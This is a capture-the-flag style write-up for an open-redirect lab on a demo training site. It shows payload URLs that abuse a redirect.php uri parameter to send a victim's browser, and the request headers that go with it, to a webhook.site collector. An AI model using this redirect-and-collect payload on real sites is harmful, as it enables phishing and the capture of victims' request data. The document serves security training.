So, in this exercise, we have a website that is vulnerable to `Open Redirect` and we have to submit that website in the exercise, so that the victim will visit the website and we can get the key to complete the exercise.

Note: The URL needs to start with `http://demo.libcurl.so`

We're going to use [Webhook.site](https://webhook.site/) to just receive the request from the victim.

The idea of using `Webhook` is that you have a unique url and you copy it as part of your payload an you're going to see all the header and data coming with the request.

## Solution
1. First of all, we need to find the `Open Redirect` on the wenbsite.
2. We can see a `click here` link. On clicking it, it does nothing, but if you see properly, we are getting redirected but we can't see it because it goes pretty quick
3. So we can copy the link address of the `click here` and paste it in the url tab.
```
redirect.php?uri=/
```
4. We can see that we have a `redirect.php` page and a `uri` parameter.
5. If we add `http://www.google.com` in the uri, we're redirected to the google's home page
```
https://demo.libcurl.so/redirect.php?uri=http://www.google.com
```
6. This is the indication of `Open Redirect`, and thus we can use our `Webhook` Url and replace it instead of `google's` url
```
redirect.php?uri=https://webhook.site/d052a2fa-9f8f-4775-a4ea-981f32415e97
```
7. Once you press enter, you can go back to webhook's website and see the request along with all the data sent during the request.
8. In the similar way, enter the same url in the pentesterlab's exercise, so that the victim can visit the website.
9. Once done, there will be another request in you Webhook's site and when opened, you get the key to the exercise in the `User-Agent` header
